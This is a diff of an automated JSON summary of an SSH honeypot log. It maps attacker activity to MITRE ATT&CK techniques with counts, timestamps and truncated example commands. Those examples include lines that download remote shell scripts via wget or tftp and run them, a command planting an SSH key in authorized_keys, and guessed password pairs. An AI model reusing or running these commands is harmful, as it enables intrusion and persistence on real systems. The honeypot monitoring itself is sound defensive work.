@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-05 20:01:21",
+  "generated": "2026-09-05 21:01:12",
   "totals": {
-    "commands": 490,
-    "login_failed": 3464,
-    "login_success": 139,
-    "sessions": 3538
+    "commands": 497,
+    "login_failed": 3489,
+    "login_success": 143,
+    "sessions": 3568
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3464,
+      "count": 3489,
       "examples": [
         "leo / leo",
         "root / Ss112233",
@@ -21,14 +21,14 @@
         "oracle / Bmw_20!_^"
       ],
       "first": "2026-09-05T00:00:02.121215Z",
-      "last": "2026-09-05T19:59:21.021529Z",
-      "unique_ips": 257
+      "last": "2026-09-05T20:59:50.438085Z",
+      "unique_ips": 263
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 189,
+      "count": 191,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-09-05T00:08:30.768655Z",
-      "last": "2026-09-05T19:34:37.543479Z",
-      "unique_ips": 21
+      "last": "2026-09-05T20:56:46.097679Z",
+      "unique_ips": 22
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 139,
+      "count": 143,
       "examples": [
         "11111111 / 11111111",
         "centos / centos22",
@@ -53,14 +53,14 @@
         "blank / 123"
       ],
       "first": "2026-09-05T00:01:25.714320Z",
-      "last": "2026-09-05T19:44:20.363526Z",
-      "unique_ips": 128
+      "last": "2026-09-05T20:56:41.683409Z",
+      "unique_ips": 130
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 64,
+      "count": 68,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
@@ -69,14 +69,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-09-05T00:08:30.768655Z",
-      "last": "2026-09-05T19:34:37.543479Z",
-      "unique_ips": 18
+      "last": "2026-09-05T20:56:46.093391Z",
+      "unique_ips": 19
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 22,
+      "count": 23,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "/bin/./uname -s -v -n -r -m"
       ],
       "first": "2026-09-05T00:37:52.763243Z",
-      "last": "2026-09-05T18:33:02.083799Z",
-      "unique_ips": 16
+      "last": "2026-09-05T20:56:46.097679Z",
+      "unique_ips": 17
     },
     {
       "id": "T1033",
@@ -106,13 +106,14 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 4,
+      "count": 5,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-05T05:09:05.285660Z",
-      "last": "2026-09-05T18:22:46.904081Z",
-      "unique_ips": 4
+      "last": "2026-09-05T20:56:46.097679Z",
+      "unique_ips": 5
     },
     {
       "id": "T1070.004",
@@ -127,6 +128,19 @@
       "unique_ips": 4
     },
     {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ls -la /",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-09-05T00:25:37.936959Z",
+      "last": "2026-09-05T20:56:46.097679Z",
+      "unique_ips": 2
+    },
+    {
       "id": "T1087.001",
       "name": "Account Discovery: Local Account",
       "tactic": "Discovery",
@@ -139,15 +153,39 @@
       "unique_ips": 2
     },
     {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "tactic": "Persistence",
       "count": 1,
       "examples": [
-        "ls -la /"
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
-      "first": "2026-09-05T00:25:37.936959Z",
-      "last": "2026-09-05T00:25:37.936959Z",
+      "first": "2026-09-05T20:56:46.097679Z",
+      "last": "2026-09-05T20:56:46.097679Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
+      ],
+      "first": "2026-09-05T20:56:41.914071Z",
+      "last": "2026-09-05T20:56:41.914071Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 1,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-09-05T20:56:46.097679Z",
+      "last": "2026-09-05T20:56:46.097679Z",
       "unique_ips": 1
     }
   ],
